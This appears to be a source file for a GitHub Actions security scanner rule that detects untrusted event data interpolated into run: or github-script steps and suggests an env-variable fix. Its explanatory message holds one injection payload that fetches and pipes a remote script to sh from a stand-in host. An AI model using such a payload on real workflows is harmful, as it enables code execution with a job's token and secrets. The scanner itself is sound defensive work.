import type { Node } from 'yaml';
import { parseActionRef } from '../actionRef';
import { findExpressions, findUntrustedReferences, PRIVILEGED_UNTRUSTED_TRIGGERS } from '../expressions';
import { makeFinding } from '../finding';
import { locateOffsets } from '../location';
import type { Finding, Rule, ScanContext } from '../types';

const ID = 'script-injection';

/** `github.event.issue.title` → `ISSUE_TITLE`. */
export function envVarName(path: string): string {
  const segs = path.split('.').filter((s) => s !== 'github' && s !== 'event' && s !== '*');
  const name = segs.slice(-2).join('_').replace(/[^a-z0-9_]/gi, '_').toUpperCase();
  return name || 'EVENT_DATA';
}

function sourceLine(source: string, offset: number): { text: string; start: number } {
  const start = source.lastIndexOf('\n', offset - 1) + 1;
  const endIdx = source.indexOf('\n', offset);
  return { text: source.slice(start, endIdx === -1 ? source.length : endIdx), start };
}

function buildFix(
  ctx: ScanContext,
  exprStart: number,
  exprEnd: number,
  varName: string,
  kind: 'run' | 'script',
): string {
  const { text, start } = sourceLine(ctx.source, exprStart);
  const relStart = exprStart - start;
  const relEnd = Math.min(exprEnd - start, text.length);
  const before = text[relStart - 1];
  const after = text[relEnd];
  let line: string;
  if (kind === 'script') {
    const quoted = before !== undefined && before === after && `'"\``.includes(before);
    line = quoted
      ? `${text.slice(0, relStart - 1)}process.env.${varName}${text.slice(relEnd + 1)}`
      : `${text.slice(0, relStart)}\${process.env.${varName}}${text.slice(relEnd)}`;
  } else {
    // Already inside a double-quoted shell string? Then a bare $VAR is quoted.
    const quotesBefore = (text.slice(0, relStart).match(/(?<!\\)"/g) ?? []).length;
    const ref = quotesBefore % 2 === 1 ? `$${varName}` : `"$${varName}"`;
    line = `${text.slice(0, relStart)}${ref}${text.slice(relEnd)}`;
  }
  line = line.trim().replace(/^-?\s*(?:run|script)\s*:\s*/, '');
  const expression = ctx.source.slice(exprStart, exprEnd);
  if (kind === 'script') {
    return `env:\n  ${varName}: ${expression}\nwith:\n  script: |\n    ${line}`;
  }
  return `env:\n  ${varName}: ${expression}\nrun: |\n  ${line}`;
}

function checkScript(ctx: ScanContext, node: Node | undefined, kind: 'run' | 'script', critical: boolean): Finding[] {
  if (!node?.range) return [];
  const [start, end] = node.range;
  const raw = ctx.source.slice(start, end);
  const findings: Finding[] = [];
  for (const expr of findExpressions(raw)) {
    const refs = findUntrustedReferences(expr.inner);
    const first = refs[0];
    if (!first) continue;
    const absStart = start + expr.start;
    const absEnd = start + expr.end;
    const varName = envVarName(first.path);
    const list = refs.map((r) => `\`${r.path}\``).join(', ');
    const where = kind === 'run' ? 'a `run:` script' : 'an `actions/github-script` script';
    findings.push(
      makeFinding(ctx, ID, locateOffsets(ctx.lineCounter, absStart, absEnd), {
        severity: critical ? 'critical' : 'high',
        title: `Untrusted input ${list} interpolated into ${where}`,
        message: `${list} is controlled by whoever opened the issue, PR, comment or commit, and \`\${{ }}\` pastes it into the script text before the shell runs it.`,
        why: `A value like \`a"; curl evil.sh | sh; echo "\` becomes part of your script and runs with this job's token and secrets.${critical ? ' This workflow uses a trigger that runs with privileged access on outsider input, so anyone on the internet can exploit it.' : ''}`,
        fix: buildFix(ctx, absStart, absEnd, varName, kind),
      }),
    );
  }
  return findings;
}

const rule: Rule = {
  id: ID,
  title: 'Script injection via untrusted input',
  severity: 'critical',
  description:
    'Attacker-controlled values (issue titles, PR bodies, branch names, commit messages…) must not be interpolated with `${{ }}` directly into `run:` or `github-script` code.',
  check(ctx) {
    const critical = ctx.workflow.triggers.some((t) => PRIVILEGED_UNTRUSTED_TRIGGERS.has(t));
    const findings: Finding[] = [];
    for (const job of ctx.workflow.jobs) {
      for (const step of job.steps) {
        findings.push(...checkScript(ctx, step.get('run'), 'run', critical));
        const uses = step.str('uses');
        const ref = uses ? parseActionRef(uses) : undefined;
        if (ref?.kind === 'remote' && ref.owner.toLowerCase() === 'actions' && ref.repo.toLowerCase() === 'github-script') {
          findings.push(...checkScript(ctx, step.map('with')?.get('script'), 'script', critical));
        }
      }
    }
    return findings;
  },
};

export default rule;
